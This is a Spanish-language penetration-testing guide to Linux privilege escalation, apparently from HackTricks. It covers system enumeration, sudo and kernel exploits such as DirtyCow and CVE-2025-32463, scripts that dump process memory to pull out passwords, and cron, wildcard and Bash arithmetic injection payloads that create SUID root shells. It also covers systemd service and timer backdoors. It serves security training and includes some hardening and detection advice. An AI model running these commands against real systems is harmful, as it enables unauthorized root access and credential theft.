# Escalada de privilegios en Linux

{{#include ../../../banners/hacktricks-training.md}}

Para obtener un contexto más amplio y consultar flujos históricos de enumeración, compara los recursos g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation y linux-private-i incluidos en las referencias.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Información del sistema

### Información del SO

Comencemos obteniendo algunos datos sobre el SO en ejecución
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Si **tienes permisos de escritura en cualquier carpeta dentro de la variable `PATH`**, es posible que puedas secuestrar algunas bibliotecas o binarios:
```bash
echo $PATH
```
### Información del entorno

¿Hay información interesante, contraseñas o API keys en las variables de entorno?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Comprueba la versión del kernel y si existe algún exploit que pueda utilizarse para escalar privilegios
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puedes encontrar una buena lista de kernels vulnerables y algunos **compiled exploits** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Otros sitios donde puedes encontrar algunos **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extraer todas las versiones vulnerables del kernel de ese sitio puedes hacer lo siguiente:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Las herramientas que podrían ayudar a buscar exploits del kernel son:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ejecutar EN la víctima; solo comprueba exploits para kernel 2.x)

Siempre **busca la versión del kernel en Google**; quizá tu versión del kernel aparezca en algún exploit del kernel y así tendrás la certeza de que este exploit es válido.

Técnicas adicionales de explotación del kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Escalada de privilegios en Linux - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versión de Sudo

Basado en las versiones vulnerables de sudo que aparecen en:
```bash
searchsploit sudo
```
Puedes comprobar si la versión de sudo es vulnerable usando este grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Las versiones de Sudo anteriores a 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permiten a usuarios locales sin privilegios escalar sus privilegios a root mediante la opción `--chroot` de sudo cuando el archivo `/etc/nsswitch.conf` se utiliza desde un directorio controlado por el usuario.<sup>[[28]](#references)[[29]](#references)</sup>

Aquí hay un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explotar esa [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de ejecutar el exploit, asegúrate de que tu versión de `sudo` sea vulnerable y de que admita la funcionalidad `chroot`.

Para obtener más información, consulta el [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) original.<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo anterior a 1.9.17p1 (rango afectado indicado: **1.8.8–1.9.17**) puede evaluar las reglas de sudoers basadas en el host utilizando el **nombre de host proporcionado por el usuario** mediante `sudo -h <host>` en lugar del **nombre de host real**. Si sudoers concede privilegios más amplios en otro host, puedes **spoof** ese host localmente.<sup>[[29]](#references)</sup>

Requisitos:
- Versión vulnerable de sudo
- Reglas de sudoers específicas del host (el host no es ni el nombre de host actual ni `ALL`)

Patrón de sudoers de ejemplo:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit mediante spoofing del host permitido:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Si la resolución del nombre falsificado se bloquea, añádelo a `/etc/hosts` o usa un hostname que ya aparezca en logs/configs para evitar consultas DNS.

#### sudo < v1.8.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg verificación de firma fallida

Consulta la **smasher2 box of HTB** para ver un **ejemplo** de cómo se podría explotar esta vuln
```bash
dmesg 2>/dev/null | grep "signature"
```
### Más enumeración del sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar posibles defensas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Si estás dentro de un contenedor, comienza con la siguiente sección de container-security y luego pasa a las páginas de abuso específicas del runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Unidades

Comprueba **qué está montado y desmontado**, dónde y por qué. Si algo está desmontado, podrías intentar montarlo y comprobar si contiene información privada
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumera binarios útiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Además, comprueba si **hay algún compilador instalado**. Esto resulta útil si necesitas usar algún kernel exploit, ya que se recomienda compilarlo en la máquina donde vas a utilizarlo (o en una similar).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software vulnerable instalado

Comprueba la **versión de los paquetes y servicios instalados**. Quizá haya alguna versión antigua de Nagios (por ejemplo) que pueda explotarse para escalar privilegios…\
Se recomienda comprobar manualmente la versión del software instalado más sospechoso.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si tienes acceso SSH a la máquina, también podrías usar **openVAS** para comprobar si hay software desactualizado y vulnerable instalado en la máquina.

> [!NOTE] > _Ten en cuenta que estos comandos mostrarán mucha información que en su mayoría será inútil; por lo tanto, se recomienda usar aplicaciones como OpenVAS o similares para comprobar si alguna versión del software instalado es vulnerable a exploits conocidos._

## Procesos

Echa un vistazo a **qué procesos** se están ejecutando y comprueba si algún proceso tiene **más privilegios de los que debería** (¿quizás un tomcat ejecutándose como root?).
```bash
ps aux
ps -ef
top -n 1
```
Comprueba siempre si hay [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) ejecutándose; podrías abusar de ellos para escalar privilegios. **Linpeas** los detecta comprobando el parámetro `--inspect` dentro de la línea de comandos del proceso.\
Comprueba también **tus privilegios sobre los binarios de los procesos**; quizá puedas sobrescribir alguno.

### Cadenas parent-child entre usuarios

Un proceso hijo ejecutándose bajo un **usuario diferente** al de su proceso padre no es automáticamente malicioso, pero es una útil **señal de triage**. Algunas transiciones son esperadas (`root` iniciando un usuario de servicio, gestores de inicio de sesión creando procesos de sesión), pero las cadenas inusuales pueden revelar wrappers, debug helpers, persistence o límites de confianza débiles en el runtime.

Revisión rápida:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Si encuentras una cadena sorprendente, inspecciona la línea de comandos del proceso padre y todos los archivos que influyen en su comportamiento (`config`, `EnvironmentFile`, scripts auxiliares, directorio de trabajo y argumentos modificables). En varias rutas reales de escalada de privilegios, el proceso hijo no era modificable, pero la **configuración controlada por el proceso padre** o la cadena de scripts auxiliares sí lo era.

### Ejecutables eliminados y archivos eliminados abiertos

Los artefactos de ejecución a menudo siguen siendo accesibles **después de su eliminación**. Esto resulta útil tanto para la escalada de privilegios como para recuperar evidencias de un proceso que ya tiene archivos confidenciales abiertos.

Comprueba si hay ejecutables eliminados:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Si `/proc/<PID>/exe` apunta a `(deleted)`, el proceso sigue ejecutando la imagen binaria antigua desde la memoria. Es una señal importante que investigar porque:

- el ejecutable eliminado puede contener strings o credenciales interesantes
- el proceso en ejecución puede seguir exponiendo file descriptors útiles
- un binario privilegiado eliminado puede indicar manipulación reciente o un intento de cleanup

Recopila globalmente los archivos eliminados y abiertos:
```bash
lsof +L1
```
Si encuentras un descriptor interesante, recupéralo directamente:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Esto es especialmente valioso cuando un proceso todavía tiene abierto un secreto eliminado, un script, una exportación de base de datos o un archivo de flags.

### Monitorización de procesos

Puedes usar herramientas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorizar procesos. Esto puede ser muy útil para identificar procesos vulnerables que se ejecutan frecuentemente o cuando se cumple un conjunto de requisitos.

### Memoria de procesos

Algunos servicios de un servidor guardan **credenciales en texto plano dentro de la memoria**.\
Normalmente necesitarás **privilegios de root** para leer la memoria de procesos que pertenecen a otros usuarios; por lo tanto, esto suele ser más útil cuando ya eres root y quieres descubrir más credenciales.\
Sin embargo, recuerda que **como usuario normal puedes leer la memoria de los procesos que posees**.

> [!WARNING]
> Ten en cuenta que actualmente la mayoría de las máquinas **no permiten ptrace de forma predeterminada**, lo que significa que no puedes volcar otros procesos que pertenezcan a tu usuario sin privilegios.
>
> El archivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla la accesibilidad de ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: todos los procesos pueden depurarse, siempre que tengan el mismo uid. Esta es la forma clásica en la que funcionaba ptrace.
> - **kernel.yama.ptrace_scope = 1**: solo puede depurarse un proceso padre.
> - **kernel.yama.ptrace_scope = 2**: solo un administrador puede usar ptrace, ya que requiere la capacidad CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: ningún proceso puede rastrearse con ptrace. Una vez establecido, es necesario reiniciar el sistema para volver a habilitar ptrace.

#### GDB

Si tienes acceso a la memoria de un servicio FTP, por ejemplo, podrías obtener el Heap y buscar dentro de él sus credenciales.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Para un ID de proceso determinado, **maps muestra cómo se mapea la memoria dentro del** espacio de direcciones virtuales **de ese proceso**; también muestra los **permisos de cada región mapeada**. El archivo pseudo **mem expone la memoria del proceso en sí**. A partir del archivo **maps** sabemos qué **regiones de memoria son legibles** y sus offsets. Usamos esta información para **buscar dentro del archivo mem y volcar todas las regiones legibles** en un archivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` proporciona acceso a la memoria **física** del sistema, no a la memoria virtual. Se puede acceder al espacio de direcciones virtuales del kernel mediante /dev/kmem.\
Normalmente, `/dev/mem` solo puede ser leído por **root** y el grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para Linux

ProcDump es una recreación para Linux de la clásica herramienta ProcDump de la suite de herramientas Sysinternals para Windows. Consíguela en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Herramientas

Para volcar la memoria de un proceso, puedes usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y volcar el proceso que te pertenece
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (se requiere root)

### Credenciales de la memoria del proceso

#### Ejemplo manual

Si descubres que el proceso de autenticación se está ejecutando:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puedes volcar el proceso (consulta las secciones anteriores para encontrar distintas formas de volcar la memoria de un proceso) y buscar credenciales dentro de la memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **robará credenciales en texto plano de la memoria** y de algunos **archivos conocidos**. Requiere privilegios de root para funcionar correctamente.

| Función                                           | Nombre del proceso         |
| ------------------------------------------------- | -------------------------- |
| Contraseña de GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (conexiones FTP activas)                   | vsftpd               |
| Apache2 (sesiones activas de HTTP Basic Auth)         | apache2              |
| OpenSSH (sesiones SSH activas - uso de Sudo)        | sshd:                |

#### Expresiones regulares de búsqueda/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Trabajos programados/Cron

### Crontab UI (alseambusher) ejecutándose como root: privesc mediante scheduler web

Si un panel web “Crontab UI” (alseambusher/crontab-ui) se ejecuta como root y solo está vinculado a loopback, aún puedes acceder a él mediante el reenvío de puertos local de SSH y crear un job privilegiado para escalar privilegios.<sup>[[1]](#references)[[4]](#references)</sup>

Cadena típica
- Descubrir el puerto limitado a loopback (por ejemplo, 127.0.0.1:8000) y el realm de Basic-Auth mediante `ss -ntlp` / `curl -v localhost:8000`
- Encontrar credenciales en artefactos operativos:
- Backups/scripts con `zip -P <password>`
- Unidad de systemd que expone `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Crear un túnel e iniciar sesión:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crea un job con privilegios elevados y ejecútalo inmediatamente (deja una shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Úsalo:
```bash
/tmp/rootshell -p   # root shell
```
Fortalecimiento
- No ejecutes Crontab UI como root; restríngele el acceso con un usuario dedicado y permisos mínimos
- Vincúlalo a localhost y restringe adicionalmente el acceso mediante firewall/VPN; no reutilices contraseñas
- Evita incluir secretos en los unit files; usa secret stores o un EnvironmentFile accesible únicamente por root
- Habilita la auditoría y el logging para las ejecuciones de jobs bajo demanda

Comprueba si algún job programado es vulnerable. Quizá puedas aprovecharte de que un script se ejecute como root (¿wildcard vuln? ¿puedes modificar archivos que usa root? ¿usar symlinks? ¿crear archivos específicos en el directorio que usa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Si se utiliza `run-parts`, comprueba qué nombres se ejecutarán realmente:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Esto evita falsos positivos. Un directorio periódico con permisos de escritura solo es útil si el nombre de archivo de tu payload coincide con las reglas locales de `run-parts`.

### Ruta de Cron

Por ejemplo, dentro de _/etc/crontab_ puedes encontrar el PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observa que el usuario "user" tiene permisos de escritura sobre /home/user_)

Si dentro de este crontab el usuario root intenta ejecutar algún comando o script sin establecer la ruta. Por ejemplo: _\* \* \* \* root overwrite.sh_\
Entonces, puedes obtener un shell de root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando un script con un comodín (Wildcard Injection)

Si un script ejecutado por root contiene un “**\***” dentro de un comando, podrías explotarlo para provocar comportamientos inesperados (como privesc). Ejemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si el wildcard está precedido por una ruta como** _**/some/path/\***_ **, no es vulnerable (ni siquiera** _**./\***_ **lo es).**

Lee la siguiente página para conocer más trucos de explotación de wildcards:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Inyección mediante expansión aritmética de Bash en parsers de logs de cron

Bash realiza la expansión de parámetros y la sustitución de comandos antes de la evaluación aritmética en ((...)), $((...)) y let. Si un cron/parser ejecutado como root lee campos de log no confiables y los introduce en un contexto aritmético, un atacante puede inyectar una sustitución de comandos $(...) que se ejecutará como root cuando se ejecute el cron.<sup>[[22]](#references)</sup>

- Por qué funciona: En Bash, las expansiones se realizan en este orden: expansión de parámetros/variables, sustitución de comandos, expansión aritmética y, después, división de palabras y expansión de nombres de ruta. Por tanto, un valor como `$(/bin/bash -c 'id > /tmp/pwn')0` se sustituye primero (ejecutando el comando) y, después, el `0` numérico restante se utiliza para la operación aritmética, de modo que el script continúa sin errores.

- Patrón vulnerable típico:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Explotación: consigue que se escriba texto controlado por el atacante en el log analizado, de modo que el campo con apariencia numérica contenga una sustitución de comandos y termine con un dígito. Asegúrate de que tu comando no escriba en stdout (o redirígelo) para que la operación aritmética siga siendo válida.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Sobrescritura de scripts de cron y symlink

Si **puedes modificar un script de cron** ejecutado por root, puedes obtener un shell fácilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si el script ejecutado por root utiliza un **directorio al que tienes acceso total**, quizá podría ser útil eliminar esa carpeta y **crear una carpeta de enlace simbólico a otra** que proporcione un script controlado por ti
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validación de enlaces simbólicos y gestión más segura de archivos

Al revisar scripts/binarios privilegiados que leen o escriben archivos mediante una ruta, verifica cómo se gestionan los enlaces:

- `stat()` sigue un enlace simbólico y devuelve los metadatos del objetivo.
- `lstat()` devuelve los metadatos del propio enlace.
- `readlink -f` y `namei -l` ayudan a resolver el objetivo final y muestran los permisos de cada componente de la ruta.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Para defenders/developers, los patrones más seguros contra los trucos con symlinks incluyen:

- `O_EXCL` con `O_CREAT`: falla si la ruta ya existe (bloquea links/archivos creados previamente por el atacante).
- `openat()`: opera de forma relativa a un file descriptor de un directorio de confianza.
- `mkstemp()`: crea archivos temporales de forma atómica con permisos seguros.

### Custom-signed cron binaries with writable payloads
Los equipos blue a veces "firman" cron-driven binaries volcando una sección ELF personalizada y buscando con grep un vendor string antes de ejecutarlos como root. Si ese binary es group-writable (por ejemplo, `/opt/AV/periodic-checks/monitor`, propiedad de `root:devs 770`) y puedes hacer leak del signing material, puedes falsificar la sección y secuestrar la cron task:<sup>[[2]](#references)</sup>

1. Usa `pspy` para capturar el verification flow. En Era, root ejecutaba `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, seguido de `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, y después ejecutaba el archivo.
2. Recrea el certificado esperado usando la leaked key/config (de `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Crea un replacement malicioso (por ejemplo, instala una bash SUID o añade tu SSH key) e inserta el certificado en `.text_sig` para que grep pase:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Sobrescribe el binary programado conservando los execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Espera a la siguiente ejecución de cron; cuando el naive signature check tenga éxito, tu payload se ejecutará como root.

### Frequent cron jobs

Puedes monitorizar los procesos para buscar procesos que se ejecuten cada 1, 2 o 5 minutos. Quizá puedas aprovecharlo para escalar privilegios.

Por ejemplo, para **monitorizar cada 0.1 s durante 1 minuto**, **ordenar por los comandos ejecutados con menor frecuencia** y eliminar los comandos que se hayan ejecutado más veces, puedes hacer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**También puedes usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (esto monitorizará y listará cada proceso que se inicie).

### Backups de root que preservan los bits de modo establecidos por el atacante (pg_basebackup)

Si un cron propiedad de root ejecuta `pg_basebackup` (o cualquier copia recursiva) contra un directorio de base de datos en el que puedes escribir, puedes colocar un **binario SUID/SGID** que se volverá a copiar como **root:root** con los mismos bits de modo en el resultado del backup.<sup>[[26]](#references)</sup>

Flujo típico de descubrimiento (como usuario de BD con pocos privilegios):
- Usa `pspy` para detectar un cron de root que ejecute algo como `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` cada minuto.
- Confirma que el clúster de origen (por ejemplo, `/var/lib/postgresql/14/main`) permite escritura por tu usuario y que el destino (`/opt/backups/current`) pasa a ser propiedad de root después de la tarea.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Esto funciona porque `pg_basebackup` conserva los bits de modo de los archivos al copiar el cluster; cuando lo ejecuta root, los archivos de destino heredan **la propiedad de root + SUID/SGID elegidos por el atacante**. Cualquier rutina de backup/copia con privilegios que conserve los permisos y escriba en una ubicación ejecutable es vulnerable.

### Cronjobs invisibles

Es posible crear un cronjob **colocando un retorno de carro después de un comentario** (sin carácter de nueva línea), y el cronjob funcionará. Ejemplo (observa el carácter de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Para detectar este tipo de entrada stealth, inspecciona los archivos cron con herramientas que muestren los caracteres de control:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Servicios

### Archivos _.service_ con permisos de escritura

Comprueba si puedes escribir en algún archivo `.service`; si puedes, **podrías modificarlo** para que **ejecute** tu **backdoor cuando** el servicio se **inicie**, **reinicie** o **detenga** (quizá tengas que esperar hasta que se reinicie la máquina).\
Por ejemplo, crea tu backdoor dentro del archivo `.service` con **`ExecStart=/tmp/script.sh`**

### Binarios de servicios con permisos de escritura

Ten en cuenta que, si tienes **permisos de escritura sobre los binarios que ejecutan los servicios**, puedes modificarlos para añadir backdoors, de modo que estos se ejecuten cuando los servicios vuelvan a ejecutarse.

### PATH de systemd - Rutas relativas

Puedes ver el PATH utilizado por **systemd** con:
```bash
systemctl show-environment
```
Si descubres que puedes **escribir** en cualquiera de las carpetas de la ruta, es posible que puedas **escalar privilegios**. Debes buscar **rutas relativas utilizadas en archivos de configuración de servicios** como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Luego, crea un **ejecutable** con el **mismo nombre que el binario de ruta relativa** dentro de la carpeta del PATH de systemd en la que puedas escribir; cuando se solicite al servicio ejecutar la acción vulnerable (**Start**, **Stop**, **Reload**), se ejecutará tu **backdoor** (normalmente, los usuarios sin privilegios no pueden iniciar ni detener servicios, pero comprueba si puedes usar `sudo -l`).

**Obtén más información sobre los servicios con `man systemd.service`.**

## **Temporizadores**

Los **temporizadores** son archivos de unidad de systemd cuyo nombre termina en `**.timer**` y que controlan archivos `**.service**` o eventos. Los **temporizadores** pueden utilizarse como alternativa a cron, ya que incluyen compatibilidad integrada para eventos de tiempo de calendario y eventos de tiempo monotónico, y pueden ejecutarse de forma asíncrona.

Puedes enumerar todos los temporizadores con:
```bash
systemctl list-timers --all
```
### Timers modificables

Si puedes modificar un timer, puedes hacer que ejecute algunos elementos de systemd.unit (como un `.service` o un `.target`)
```bash
Unit=backdoor.service
```
En la documentación puedes leer qué es la Unit:

> La unit que se activará cuando transcurra este timer. El argumento es un nombre de unit cuyo sufijo no es ".timer". Si no se especifica, este valor toma como valor predeterminado un service que tiene el mismo nombre que la unit del timer, excepto por el sufijo. (Consulta lo anterior). Se recomienda que el nombre de la unit que se activa y el nombre de la unit del timer sean idénticos, excepto por el sufijo.

Por lo tanto, para abusar de este permiso necesitarías:

- Encontrar alguna unit de systemd (como un `.service`) que esté **ejecutando un binario modificable**
- Encontrar alguna unit de systemd que esté **ejecutando una ruta relativa** y sobre la que tengas **privilegios de escritura** en el **PATH de systemd** (para suplantar ese ejecutable)

**Obtén más información sobre los timers con `man systemd.timer`.**

### **Activar el timer**

Para activar un timer necesitas privilegios de root y ejecutar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Ten en cuenta que el **timer** se **activa** creando un symlink hacia él en `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

